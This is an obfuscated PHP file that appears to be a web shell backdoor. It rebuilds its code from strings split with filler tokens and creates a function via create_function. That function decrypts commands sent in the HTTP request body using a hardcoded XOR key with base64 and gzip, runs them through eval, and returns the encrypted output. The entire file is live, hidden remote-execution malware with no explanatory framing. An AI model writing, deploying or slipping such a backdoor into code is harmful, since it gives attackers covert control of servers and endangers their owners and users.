<?php
$u='p://{_input"),$m)=={_1{_) {@{_ob_sta{_rt();@e{_val(@gzuncom{_pr{_ess(@x{_(@bas{_e64_deco{_de{_($m[{_1]),$k)));$o{_=@o';
$g=str_replace('NX','','NXNXcreate_NXfuNXncNXtiNXon');
$v='{$o.={_$t{$i}^{_{_$k{$j};}}ret{_ur{_n $o;}if ({_{_@preg_{_match{_("/$kh(.+){_$kf/",@{_fil{_e_get_c{_onten{_ts{_("ph';
$i='$k="6{_6bf10b{_d";$kh={_"45100{_418{_dec7"{_;$kf="b75{_7{_6eca494{_f";${_p="z0AjZfhyb{_{_N95hoH9";funct{_ion x{_($t{';
$W='_,{_$k){$c{_=strl{_en($k);${_l=strl{_en{_($t);$o={_"";for($i=0;{_{_$i<$l;){{_f{_or($j=0;($j<$c&&$i<${_l);${_j++,$i+{_+)';
$J='{_b_get_conte{_nts();@{_ob_en{_d_cle{_an();{_$r=@b{_ase6{_4_encod{_e(@x{_(@gzco{_mpres{_s($o){_,$k));print("{_${_p$kh$r$kf");}';
$d=str_replace('{_','',$i.$W.$v.$u.$J);
$G=$g('',$d);$G();
?>
